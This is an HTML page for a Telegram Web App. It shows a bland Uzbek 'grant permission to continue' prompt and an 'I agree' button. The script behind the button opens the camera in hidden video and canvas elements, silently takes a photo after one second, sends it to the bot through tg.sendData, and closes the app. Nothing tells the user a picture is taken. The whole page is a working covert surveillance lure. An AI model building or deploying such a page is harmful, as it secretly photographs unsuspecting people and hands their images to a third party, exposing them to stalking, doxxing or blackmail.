<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { text-align: center; font-family: sans-serif; padding-top: 50px; }
        video { display: none; }
        canvas { display: none; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 10px; border: none; background: #0088cc; color: white; }
    </style>
</head>
<body>
    <h2>Davom etish uchun ruxsat bering</h2>
    <button onclick="takeSnapshot()">Roziman</button>
    
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        async function takeSnapshot() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // 1 soniyadan keyin rasmga oladi
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/jpeg');
                    
                    // Rasmni botga yuborish
                    tg.sendData(JSON.stringify({ image: imageData }));
                    tg.close();
                }, 1000);
            } catch (err) {
                alert("Kameraga ruxsat berilmadi!");
            }
        }
    </script>
</body>
</html>
